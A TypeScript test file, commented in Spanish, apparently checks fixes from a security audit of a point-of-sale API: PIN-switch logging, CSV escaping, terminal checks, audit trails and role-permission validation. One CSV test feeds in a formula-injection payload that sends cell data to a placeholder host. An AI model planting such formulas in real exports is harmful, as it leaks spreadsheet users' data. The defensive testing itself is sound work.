// Arreglos de la auditoría de seguridad del 19-nov-2026 (M3, M4, B1-B8).
import { createRequire } from "node:module";
import { describe, expect, it, vi } from "vitest";

createRequire(new URL("../apps/api/package.json", import.meta.url))(
  "reflect-metadata",
);

vi.mock("../apps/api/src/security", async (original) => ({
  ...(await original<typeof import("../apps/api/src/security")>()),
  // Sin base: el PIN se compara con la función real de la ruta.
  verifyPinAttempt: async (_db: unknown, _key: string, verify: () => any) => {
    const id = await verify();
    if (!id) throw new Error("PIN incorrecto.");
    return id;
  },
}));

const BRANCH = "main";
const actor = {
  id: "11111111-1111-4111-8111-111111111111",
  name: "Cajera A",
  role: "seller",
  permissions: ["sale:write"],
  branchId: BRANCH,
  terminalId: "t1",
  ip: "10.0.0.5",
} as any;

describe("M3 · el cambio de usuario con PIN exitoso queda en la bitácora", () => {
  const target = {
    id: "22222222-2222-4222-8222-222222222222",
    name: "Cajera B",
    active: true,
    branchId: BRANCH,
    pinHash: "",
    role: { name: "seller", permissions: ["sale:write"] },
  };
  const setup = async () => {
    const { AuthController, passwordHash } =
      await import("../apps/api/src/auth");
    target.pinHash ||= await passwordHash("482913");
    const logs: any[] = [];
    const db: any = {
      user: { findFirst: async () => target },
      auditLog: { create: async (args: any) => logs.push(args.data) },
    };
    const controller = new AuthController(db, {} as any, {} as any);
    (controller as any).issue = async () => ({ accessToken: "x" });
    return { controller, logs };
  };
  it("registra pin_switch con origen, destino, equipo e IP", async () => {
    const { controller, logs } = await setup();
    await controller.pin(
      actor,
      { userId: target.id, pin: "482913" },
      {} as any,
    );
    const row = logs.find((l) => l.action === "pin_switch");
    expect(row).toMatchObject({
      userId: actor.id,
      entity: "user",
      entityId: target.id,
      terminalId: "t1",
      ip: "10.0.0.5",
      branchId: BRANCH,
    });
  });
  it("con PIN incorrecto no se registra el cambio", async () => {
    const { controller, logs } = await setup();
    await expect(
      controller.pin(actor, { userId: target.id, pin: "000000" }, {} as any),
    ).rejects.toThrow();
    expect(logs.some((l) => l.action === "pin_switch")).toBe(false);
  });
  it("se conserva como acción de seguridad (400 días)", async () => {
    const { SECURITY_AUDIT_ACTIONS } =
      await import("../apps/api/src/retention");
    expect(SECURITY_AUDIT_ACTIONS).toContain("pin_switch");
  });
});

describe("B2 · las alertas de seguridad de cuentas solo las ve la dueña", () => {
  it("login_unapproved_device y account_locked son solo de la dueña", async () => {
    const { OWNER_ONLY_ALERT_TYPES } = await import("../apps/api/src/alerts");
    expect(OWNER_ONLY_ALERT_TYPES).toEqual(
      expect.arrayContaining(["login_unapproved_device", "account_locked"]),
    );
  });
});

describe("B1 · el CSV de ingresos neutraliza fórmulas en celdas de texto", () => {
  it("antepone ' a texto que empieza con = + - @ tabulación o retorno", async () => {
    const { csvCell } = await import("../apps/api/src/income-report");
    expect(csvCell('=HYPERLINK("http://x/?d="&A2,"ver")')).toBe(
      `"'=HYPERLINK(""http://x/?d=""&A2,""ver"")"`,
    );
    expect(csvCell("+1 809")).toBe("'+1 809");
    expect(csvCell("-cmd")).toBe("'-cmd");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
  });
  it("los importes negativos y el texto normal no cambian", async () => {
    const { csvCell } = await import("../apps/api/src/income-report");
    expect(csvCell("-125.50")).toBe("-125.50");
    expect(csvCell("Banco Popular")).toBe("Banco Popular");
    expect(csvCell(null)).toBe("");
  });
});

describe("B3 · el pago a proveedor exige equipo aprobado", () => {
  it("POST /supplier-payments lleva @RequireTerminal", async () => {
    const { AdminController } = await import("../apps/api/src/admin");
    expect(
      Reflect.getMetadata(
        "terminal",
        AdminController.prototype.supplierPayment,
      ),
    ).toBe(true);
  });
});

describe("B8 · escrituras de configuración dejan rastro en la bitácora", () => {
  const ID = "33333333-3333-4333-8333-333333333333";
  const manager = { ...actor, role: "manager", permissions: ["*"] };
  const fakeDb = (extra: Record<string, any> = {}) => {
    const logs: any[] = [];
    const row = (args: any) => ({ id: ID, ...(args.data ?? {}) });
    const db: any = {
      logs,
      auditLog: { create: async (args: any) => logs.push(args.data) },
      supplier: { create: async (a: any) => row(a) },
      expenseCategory: {
        create: async (a: any) => row(a),
        findUniqueOrThrow: async () => ({ id: ID, monthlyBudget: 100 }),
        update: async (a: any) => row(a),
      },
      brand: { create: async (a: any) => row(a) },
      ...extra,
    };
    return db;
  };
  it("POST /suppliers", async () => {
    const { AdminController } = await import("../apps/api/src/admin");
    const db = fakeDb();
    await new AdminController(db).supplier({ name: "Proveedor X" }, manager);
    expect(db.logs).toContainEqual(
      expect.objectContaining({ action: "create", entity: "supplier" }),
    );
  });
  it("POST y PATCH /expense-categories", async () => {
    const { AdminController } = await import("../apps/api/src/admin");
    const db = fakeDb();
    const c = new AdminController(db) as any;
    await c.expenseCategory({ name: "Luz", monthlyBudget: 500 }, manager);
    await c.budget(ID, { monthlyBudget: 900 }, manager);
    expect(db.logs.map((l: any) => [l.action, l.entity])).toEqual([
      ["create", "expense_category"],
      ["update", "expense_category"],
    ]);
    expect(db.logs[1]).toMatchObject({
      before: { monthlyBudget: 100 },
      after: { monthlyBudget: 900 },
    });
  });
  it("POST /brands", async () => {
    const { CatalogController } = await import("../apps/api/src/catalog");
    const db = fakeDb();
    await (new CatalogController(db) as any).brand({ name: "Marca" }, manager);
    expect(db.logs).toContainEqual(
      expect.objectContaining({ action: "create", entity: "brand" }),
    );
  });
  it("POST /inventory/counts", async () => {
    const { InventoryController } = await import("../apps/api/src/inventory");
    const db = fakeDb({
      warehouse: {
        findUnique: async () => ({ id: "w1", sellable: true }),
      },
      variant: { findFirstOrThrow: async () => ({ id: ID, stock: 4 }) },
      inventoryCount: { create: async (a: any) => ({ id: ID, ...a.data }) },
    });
    await new InventoryController(db).count(
      { items: [{ variantId: ID, counted: 3 }] },
      manager,
    );
    expect(db.logs).toContainEqual(
      expect.objectContaining({ action: "create", entity: "count" }),
    );
  });
});

describe("B5 · PUT /roles solo acepta permisos conocidos", () => {
  const ROLE = "44444444-4444-4444-8444-444444444444";
  const owner = { ...actor, role: "admin", permissions: ["*"] };
  const setup = async (name: string) => {
    const { AdminController } = await import("../apps/api/src/admin");
    const updates: any[] = [];
    const db: any = {
      role: { findUniqueOrThrow: async () => ({ id: ROLE, name }) },
      $transaction: async (fn: any) =>
        fn({
          role: {
            update: async (a: any) => (updates.push(a.data), a.data),
          },
          auditLog: { create: async () => undefined },
        }),
    };
    return { c: new AdminController(db), updates };
  };
  it("rechaza un permiso inventado", async () => {
    const { c, updates } = await setup("warehouse");
    await expect(
      c.role(ROLE, { permissions: ["catalog:read", "todo:poder"] }, owner),
    ).rejects.toThrow(/todo:poder/);
    expect(updates).toHaveLength(0);
  });
  it("acepta los permisos de la lista", async () => {
    const { c, updates } = await setup("warehouse");
    await c.role(
      ROLE,
      { permissions: ["catalog:read", "inventory:write"] },
      owner,
    );
    expect(updates).toHaveLength(1);
  });
  it("el rol con contraseña de 6 números no recibe * ni sale:manage", async () => {
    for (const p of ["*", "sale:manage"]) {
      const { c, updates } = await setup("seller");
      await expect(
        c.role(ROLE, { permissions: ["sale:write", p] }, owner),
      ).rejects.toThrow(/6 números/);
      expect(updates).toHaveLength(0);
    }
  });
});
